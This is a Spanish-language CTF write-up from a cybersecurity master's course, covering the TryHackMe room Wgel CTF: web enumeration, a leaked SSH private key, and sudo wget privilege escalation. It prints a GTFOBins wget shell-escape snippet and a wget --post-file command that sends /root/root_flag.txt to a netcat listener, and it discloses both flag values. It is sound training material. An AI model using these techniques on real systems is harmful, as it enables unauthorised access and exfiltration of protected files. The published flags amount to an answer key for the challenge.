<h1 align="center">🫠 Wgel CTF — Writeup Completo</h1>

<p align="center">
  <img src="https://img.shields.io/badge/Plataforma-TryHackMe-red?logo=tryhackme&logoColor=white" alt="TryHackMe">
  <img src="https://img.shields.io/badge/Dificultad-Easy-brightgreen.svg" alt="Easy">
  <img src="https://img.shields.io/badge/OS-Linux-informational?logo=linux&logoColor=white" alt="Linux">
  <img src="https://img.shields.io/badge/Módulo-Hacking%20Ético-darkred.svg?logo=hackthebox&logoColor=white" alt="Hacking Ético">
  <img src="https://img.shields.io/badge/Grado-Máster%20en%20Ciberseguridad-gold.svg" alt="Máster Ciberseguridad">
</p>

<p align="center">
  <i>Memoria de operación ofensiva sobre la room Wgel CTF de TryHackMe. Enumeración web tenaz en múltiples iteraciones, exfiltración de clave privada RSA expuesta al público, dominación del entorno SSH y escalada de privilegios a través de un inteligente abuso del binario wget (con sudo sin contraseña) tras adaptar y descartar vectores inválidos de GTFOBins.</i>
</p>

---

> [!WARNING]
> **Aviso Legal.** Este writeup ha sido elaborado exclusivamente con fines académicos en el contexto del **Máster en Ciberseguridad**. Las técnicas documentadas se han aplicado únicamente sobre infraestructura propia de TryHackMe bajo sus condiciones de uso. El autor declina toda responsabilidad por usos indebidos de la información recogida.

---

## 📑 Índice

1. [Resumen Ejecutivo](#-1-resumen-ejecutivo)
2. [Vectores de Ataque](#-2-vectores-de-ataque-owasp-y-mitre)
3. [Herramientas Utilizadas](#-3-herramientas-utilizadas)
4. [Fase 1 — El Terreno de Juego (Reconocimiento Nmap)](#-4-fase-1--el-terreno-de-juego-reconocimiento-nmap)
5. [Fase 2 — El Laberinto de Sitemap (Enumeración Web)](#-5-fase-2--el-laberinto-de-sitemap-enumeración-web)
6. [Fase 3 — Inspección Oculta y el Oro RSA (Ajuste de Fuzzing)](#-6-fase-3--inspección-oculta-y-el-oro-rsa-ajuste-de-fuzzing)
7. [Fase 4 — Identidad Revelada (Inspección HTML)](#-7-fase-4--identidad-revelada-inspección-html)
8. [Fase 5 — Acceso Total Inesperado (SSH)](#-8-fase-5--acceso-total-inesperado-ssh)
9. [Fase 6 — Bandera Nativa de Usuario](#-9-fase-6--bandera-nativa-de-usuario)
10. [Fase 7 — Restricciones y Fracasos (Evaluando Sudo y Wget)](#-10-fase-7--restricciones-y-fracasos-evaluando-sudo-y-wget)
11. [Fase 8 — Atacante al Rescate (Bypass con POST File)](#-11-fase-8--atacante-al-rescate-bypass-con-post-file)
12. [Flags Obtenidas](#-12-flags-obtenidas)
13. [Conclusión](#-13-conclusión)

---

## 📌 1. Resumen Ejecutivo

La room **Wgel CTF** incita explícitamente a mantener una postura tenaz frente a la enumeración. Empezamos validando los puertos básicos (22 y 80), para sumergirnos en un análisis web que nos hace dar pasos en falso contra formularios trampa. Es la insistencia mutando parámetros en *Gobuster* la que nos revela un malogrado directorio `.ssh` flotando impunemente y regalándonos la mítica `id_rsa`. Emparejándola en SSH con el nombre de usuario de su administrador, filtrado en un mal hábito de indexación, obtenemos acceso. La elevación de privilegios la completé descubriendo que el binario de descargas `wget` poseía concesiones nativas para correr sin credencial, facilitándonos exfiltrar por pura lógica ciega al superusuario hacia nuestro propio auditor de escucha (*netcat*).

---

## 🎯 2. Vectores de Ataque (OWASP y MITRE)

- [x] **Sensitive Data Exposure:** Repositorio en directorio `.ssh` alojado inadvertidamente a merced de visualización cruda junto a la valiosísima llave privada RSA integral. *(OWASP A02:2021)*
- [x] **Information Disclosure:** Rastro en texto plano por un programador imprudente, regalando dentro del esqueleto web nativo (`index.html`) una mención y el uso explícito del encargado en jefe.
- [x] **Security Misconfiguration:** Falta total en las redirecciones predeterminadas de control o negación (`403 Forbidden`) sobre accesos vitales de red en subcarpetas ocultas. *(OWASP A05:2021)*
- [x] **Privilege Escalation (Sudo Abuse):** Malversación intencionada de permisos al permitir accionar `NOPASSWD` contra un binario capaz de sustraer o emitir archivos localizados (`/usr/bin/wget`). *(MITRE TA0004)*

---

## 🛠️ 3. Herramientas Utilizadas

| Herramienta | Propósito |
|:---|:---|
| `nmap` | Diagnóstico activo de la terminal descubriendo el 100% perimetral. |
| `gobuster` | Fuzzing dinámico a los directorios del host. |
| Navegador Web | Recolección limpia para escudriñar rastros visuales directos. |
| `ssh` | Utilidad pilar para aplicar el inicio inyectando a la vena las credenciales crudas. |
| `nc` | Emulador Netcat instanciado localmente recibiendo todo dato ciego proyectado a voluntad. |
| `GTFOBins` | Bibliografía documental por excelencia sobre vectores de desbordamiento en utilidades comunes (LoLBins). |

---

## 💻 4. Fase 1 — El Terreno de Juego (Reconocimiento Nmap)

Con la máquina oficialmente viva en mi entorno TryHackMe, la primera acción es obligatoria e inamovible: auditar qué me está enseñando al exterior. Realizo un escaneo de puertos inicial y general usando mis etiquetas agresivas pero seguras de confianza con un sondeo `SYN Stealth`. 

```bash
sudo nmap -T4 -vvvv -sS 10.129.181.52
```

Tal y como esperaba en esta base formativa, la recolección empeza a asomar la típica dupla.

<p align="center">
  <img src="imagenes/nmap-ejecucion-cli.png" alt="Ejecución Nmap CLI"/>
</p>

El resultado final se torna sencillo. Solo observo dos únicas banderas levantadas, los servicios estándar SSH y HTTP en sus puertos clásicos correspondientes asomando vida desde su raíz. Puesto que para el 22 carezco de toda credencial imaginable, concentro mi inicio enteramente en la cara web del puerto 80.

<p align="center">
  <img src="imagenes/nmap-resultado-apacheport-80.png" alt="Resultado Nmap — Puerto 80 Apache y 22 SSH"/>
</p>

---

## 🌐 5. Fase 2 — El Laberinto de Sitemap (Enumeración Web)

Lo primero que hago es apuntar agresivamente mi herramienta de fuerza probando listar diferentes endpoints de interés. Comando `gobuster` cargando un diccionario medio de DirBuster.

```bash
sudo gobuster dir -u http://10.129.181.52/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,txt,html
```

<p align="center">
  <img src="imagenes/gobuster-ejecucion-cli-1.png" alt="Gobuster — Primera ejecución CLI"/>
</p>

En esta recolección global asoma a golpe de redirección código 301 un peculiar entorno colgado en la URL final: `/sitemap`. Lo investigo en navegador visualmente y descubro que es una página web aparentemente ficticia que vende diferentes servicios genéricos corporativos. Tiene algún que otro comentario flotando pero nada que me comprometa o facilite las tan ansiadas flags. 

Decido por tanto empujar de nuevo el escurridizo Gobuster hacia ese mismo endpoint y forzarle otro peinado para ver de qué sub-archivos html depende esta web.

```bash
sudo gobuster dir -u http://10.129.181.52/sitemap -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50 -x php,txt,html
```

<p align="center">
  <img src="imagenes/gobuster-ejecucion-2.png" alt="Gobuster — Segunda ejecución sobre /sitemap"/>
</p>

Como documenta el barrido, detecto más de 4 endpoints vitales (contacto, servicios, sobre nosotros...). Tontamente honesto, paso de las herramientas y reviso los HTML visualmente intentando trastear con todos ellos.

<p align="center">
  <img src="imagenes/gobuster-resultado-2.png" alt="Gobuster — Resultado 2: páginas HTML"/>
</p>

Localizado el "Contact Us", caí con todo: inserté datos rellenando inútilmente campos por doquier buscando mandar una petición y sondearla en respuesta. Más tarde intenté meterle código por *XSS*, todo sin el más aparente éxito válido que valiera para seguir por este pozo en seco.

<p align="center">
  <img src="imagenes/contactus-localizado.png" alt="Contacto localizado — sin vectores"/>
</p>

---

## 🔑 6. Fase 3 — Inspección Oculta y el Oro RSA (Ajuste de Fuzzing)

Entendiendo que me he dado de bruces, y negándome a abandonar una vía web que tiene que esconder algo más allá de una plantilla genérica, rearmo mi herramienta de *fuzzing*. Deduzco que Gobuster no chuta más fuerte por no tener una base de rastreo dedicada. 

Quito las condicionales estáticas y le enchufo directo una de mis listas favoritas y letales de localizadores que guardamos en Kali: `dirb/common.txt`.

```bash
gobuster dir -u http://10.129.157.148/sitemap/ -w /usr/share/wordlists/dirb/common.txt -t 50 
```

¡Maldita sea! La pantalla asoma de golpe un tesoro que había pasado totalmente desapercibido por las anteriores extensiones. Oculto a simple vista, el servidor me desvela algo grotescamente expuesto en formato de acceso HTTP público: Un santuario `.ssh`.

<p align="center">
  <img src="imagenes/gobuster-ejecucion-3ssh.png" alt="Gobuster — Tercera ejecución, descubre .ssh"/>
</p>

Resultaba que esa subcarpeta estaba visible y disponible. Yacía colgando libremente y apuntaba hacia un fallo incomprensible de despliegue donde, el mismísimo núcleo maestro asomado bajo `id_rsa`, se encontraba tirado a la luz del día y regalando la llave RSA maestra descifradora a quien cruzara su enlace.

<p align="center">
  <img src="imagenes/gobuster-resultado-3.png" alt="Gobuster — Resultado 3: .ssh expuesto"/>
</p>

Como no podía ser de otra forma, la copié entera a mi local y la aseguré con mimo en mi máquina atacante antes de que nadie dijese nada más.

<p align="center">
  <img src="imagenes/clave-privada-hallada.png" alt="Clave privada RSA encontrada en .ssh"/>
</p>

---

## 🖥️ 7. Fase 4 — Identidad Revelada (Inspección HTML)

Poseedor único de la grandiosa llave privada, mi escollo ahora era simple: ¿Contra qué cerradura u host de usuario iba a poder girarla en el panel SSH? 

Como no tenía en claro quién iba a comandar en el servidor ni me funcionaría el dictado ciego con contraseñas RSA, dediqué mi regreso de investigación de HTML base a algo que visualicé por encima en los trasteos inciales. 

Haciendo un `Ctrl+U`, revisé el esqueleto principal localizando por enésima vez a quien seguramente lo habría orquestado; un tonto comentario del programador de la web hacia sí mismo o hacia otro usuario que literalmente expone e inmortaliza al usuario "**jessie**".

<p align="center">
  <img src="imagenes/index-analizado-usuario-jessie-comentario.png" alt="Código fuente — comentario con usuario jessie"/>
</p>

> [!NOTE]
> De nuevo, como novato, no todo sale rodado a la primera. Originalmente intenté el intento crudo logando directamente usando a "Jessie" (con la J en mayúscula tal como reza en el comentario HTML). Tras ver que el prompt de fallos se resistía, lo adapté instintivamente forzando minúsculas: *jessie*. ¡Bingo! Un detalle minúsculo y frustrante.

---

## 🔐 8. Fase 5 — Acceso Total Inesperado (SSH)

Con *jessie* confirmado y el oro de la base encriptada bajo local, restaba afilar todo el arsenal para el salto al vació, no sin antes aplicarle con `chmod 600` la protección forzosa obligatoria a las llaves maestras por exigencia de Línux.

```bash
chmod 600 id_rsa
ssh -i id_rsa jessie@10.129.157.148
```

<p align="center">
  <img src="imagenes/guardar-llave-permisos600.png" alt="chmod 600 sobre id_rsa"/>
</p>

La terminal parpadea y mi consola de mi atacante pasa de ser de auditor ciego a administrador absoluto inyectado bajo un túnel inexpugnable. He invadido Wgel satisfactoriamente. Estoy dentro.

<p align="center">
  <img src="imagenes/acceso-clave-sshpriv-jessie.png" alt="SSH como jessie con clave privada"/>
</p>

---

## 🏳️ 9. Fase 6 — Bandera Nativa de Usuario

Ya sobre el servidor listé todo lo que este permitía revisar y comprobé el entorno nativo del Home del sujeto. Como en tantas ocasiones en estadios primarios, un simple listado sobre Documentos me mostró en crudo y de frente mi primera gran meta. 

```bash
ls -lah Documents/
cat Documents/user_flag.txt
```

<p align="center">
  <img src="imagenes/flag-usuario-estandar-hallada.png" alt="Flag de usuario — 057c67131c3d5e42dd5cd3075b198ff6"/>
</p>

El `cat` imprimió a terminal: `057c67131c3d5e42dd5cd3075b198ff6`. Primera victoria corroborada en la room. A por el trono y el jefe maestro.

---

## ⚡ 10. Fase 7 — Restricciones y Fracasos (Evaluando Sudo y Wget)

Llegado a este escollo crucial, mi meta ahora era rootear el sistema y conseguir su correspondiente *flag*. Por puro reflejo investigativo empecé invocando a los permisos de subasta bajo este usuario, y así generarme una leve idea por la que tirar mis tiros. 

Al dictaminar `sudo -l`, el terminal me chivó dos factores: que efectivamente jessie era capaz de alzar los privilegios, y que había un agujero monumental llamado `/usr/bin/wget` colgado bajo la etiqueta `NOPASSWD`. 

Lo he probado en mi entorno... y me dejaba bajar todo o interactuar sin que pidieran contraseña maestro. 

<p align="center">
  <img src="imagenes/wget-sudo-nopasswd-parajessie.png" alt="sudo -l — wget NOPASSWD"/>
</p>

Como no soy de quedarme observando, abrí de ipso facto la enciclopedia del hacker y de los LoLBins locales: **GTFOBins**. Ahí asomaba victoriosa una ruta maestra que prometía elevarnos abriéndonos la terminal interactiva a través del inofensivo `wget` emulando el script *#path/to/script*. 

Mi júbilo y las directivas eran estas:

```bash
echo -e '#!/bin/sh\n/bin/sh 1>&0' >/path/to/temp-file
chmod +x /path/to/temp-file
wget --use-askpass=/path/to/temp-file 0
```

<p align="center">
  <img src="imagenes/vulnerabilidad-shell-encontrada-gtfobins.png" alt="GTFOBins — wget shell exploit"/>
</p>

Pero GTFOBins no lo es todo... Al lanzar el vector exacto con la ruta, recibí un sonoro y frustrante fallo del script. Las variables ambientales no conjugaban, y la directiva rebotó inservible. Mi shell raíz de `wget` no operó dejándome totalmente atascado y desamparado de manual inicial.

---

## 🏴 11. Fase 8 — Atacante al Rescate (Bypass con POST File)

Estando jodido sin que el método de escalado se mostrase afín, dediqué unos valiosos minutos a replantear el poder crudo de `wget`. Lo que este binario hace como raíz es "hacer llamadas" e ingerir datos de internet. 

Como no puedo chocar una llamada general hacia el sistema para abrirme la ventana, investigué sobre sus atributos paramétricos puros. Hallé uno espléndido: `--post-file=`. Con este parámetro ordenaría que `wget` subiera y vomitara cualquier lectura bruta que tuviera localmente hacía un receptor ciego. Y dado que corría *bajo privilegios maestro root*, podría obligarle a leer lo que jessie bajo ningún concepto vería.

¿Pero el qué? Como no tenía comodines, asumí el dictado general intuitivo: Si nuestra bandera era `user_flag.txt`, en la ruta de inicio su antagonista debía brillar como `root_flag.txt`. A cara de perro, lancé de señuelo mi propio panel por Netcat asumiendo recibir por el puerto estático lo que me trajese de vuelta.

```bash
nc -lvnp 80
```

Y en el SSH ajeno, arranco la escalada inyectada sobre raíz:

```bash
sudo /usr/bin/wget --post-file=/root/root_flag.txt 192.168.132.194
```

<p align="center">
  <img src="imagenes/iniciado-wget-postfile.png" alt="wget --post-file=/root/root_flag.txt"/>
</p>

La consola Línux quedó anclada... ¡y al instante netcat en Kali estalló visualmente ante mis ojos, logueando un tráfico directo en `POST` bajo conexión IP, estampando como una hostia visual tremenda el `33 bytes` devuelto de nuestro ansiado código oscuro del superusuario!

<p align="center">
  <img src="imagenes/obtenida-flag-root-nclistener.png" alt="nc listener — root flag recibida"/>
</p>

¡Absolutamente genial! Confirmo e inyecto ambas flags en el panel THM. Al ver la preciada barranca y el distintivo del 100%, noto en mi avance lo gratificante que es este entorno práctico. 

Como estudiante y primerizo en un nivel real estoy mejorando poco a poco —a trompicones y lecturas— mi forma natural de pensar como pentester, dejando a un lado solo ver la receta e ingeniármelas.

<p align="center">
  <img src="imagenes/foto-room-copmpletada.png" alt="Room Wgel CTF completada"/>
</p>

---

## 🚩 12. Flags Obtenidas

| Nivel Operativo | Hash Visual Validado | Ruta de Almacenaje Base |
|:----:|:-----|:-----|
| 🏳️ **Usuario (User)** | `057c67131c3d5e42dd5cd3075b198ff6` | `/home/jessie/Documents/user_flag.txt` |
| 🏴 **Sistema (Root)** | `b1b968b37519ad1daa6408188649263d` | `/root/root_flag.txt` |

---

## ✅ 13. Conclusión

El paso completo por **Wgel CTF** escenifica dos premisas fundamentales y puramente maduras en lo alto del pentesting en vivo.

**Sobre la enumeración general:** Lo vital es y siempre debe ser una constancia técnica inagotable y tenaz. Es normal ver caer barridos iniciales al agua, y como aquí demuestro, si me hubiese conformado y resignado a trastear con los huecos huecos inoperantes de `/contact.html`, hubiese ignorado para siempre un filón monumental a puerta cerrada. Cambiar de `directory-list` a `common.txt` fue la clave del éxito. En un vector web que parece limpio, a menudo solo basta rascar con un nuevo foco incisivo en base para desvelar subastas críticas expuestas sin ningún tipo de `chmod 403`, como en efecto lo fue un absurdo `.ssh` colgando frente a mis narices.

**Adaptar la adversidad a tu campo (Bypass):** Que un manual (Como `GTFObins`) sea una enciclopedia formidable, dista muchísimo de certificar soluciones unánimes infalibles. El `shell method` erró estruendosamente dejándome varado sin el root directo; obligándome al unísono de manera espléndida a salirme del marco técnico para resolver el problema adaptando un túnel rudimentario enviando peticiones externas e ciegas, validando una escalada sublime mediante NetCat. Entender tu entorno y tus armas vale infinitamente más que lanzar `wget` como papagallos.

### 📚 Bibliografía y Referencias

- [TryHackMe — Wgel CTF](https://tryhackme.com/room/wgelctf)
- [GTFOBins — wget Method](https://gtfobins.github.io/gtfobins/wget/)
- [Gobuster Enumeration](https://github.com/OJ/gobuster)
- [OWASP Security Misconfiguration](https://owasp.org/Top10/)

---

<hr>
<p align="center">
  <i>Writeup elaborado como parte del módulo de Hacking Ético — Máster en Ciberseguridad.</i>
</p>
